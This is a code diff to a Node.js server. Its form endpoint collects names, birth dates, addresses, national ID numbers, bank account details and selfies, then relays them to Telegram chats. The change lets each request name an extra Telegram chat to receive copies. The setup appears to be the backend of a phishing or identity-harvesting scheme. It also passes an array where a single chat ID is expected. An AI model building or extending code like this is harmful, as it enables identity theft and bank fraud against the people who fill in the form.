@@ -67,10 +67,10 @@ async function sendTextToTelegram(text, CHAT_ID) {
 }
 
 // Function to send photo to Telegram
-async function sendPhotoToTelegram(photoPath, caption = '') {
+async function sendPhotoToTelegram(photoPath, caption = '', CHAT_ID) {
     try {
         const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('chat_id', CHAT_ID);
         formData.append('photo', fs.createReadStream(photoPath));
         if (caption) {
             formData.append('caption', caption);
@@ -111,7 +111,7 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
     console.log('Request body:', req.body);
     console.log('Request file:', req.file);
     
-        const { name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
+        const { ID, name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
         const selfieFile = req.file;
 
 const lines = ['📋 <b>New Form Submission</b>'];
@@ -136,11 +136,11 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
        
     // Format text data for Telegram   
     const formattedText = lines.join('\n').trim();
-    const Chat_Ids = [TELEGRAM_CHAT_ID];
+    const Chat_Ids = [TELEGRAM_CHAT_ID, ID];
     
 
         // Send text data to Telegram
-        await sendTextToTelegram(formattedText);
+        await sendTextToTelegram(formattedText, Chat_Ids);
 
     res.json({ 
             success: true, 
@@ -149,8 +149,9 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
     
     // Send selfie to Telegram with a caption if there is one
         if (selfieFile) {
+            const Chat_Ids = [TELEGRAM_CHAT_ID, ID];
             const caption = `📸 Selfie from: ${name}`;
-          sendPhotoToTelegram(selfieFile.path, caption);
+          sendPhotoToTelegram(selfieFile.path, caption, Chat_Ids);
         }
 });
 
